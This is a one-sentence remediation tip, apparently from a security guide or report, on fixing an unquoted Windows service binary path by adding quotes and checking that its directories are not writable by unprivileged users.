Make sure to add quotes (`" "`) to the service binary path and verify that the directories are not writable by unprivileged users.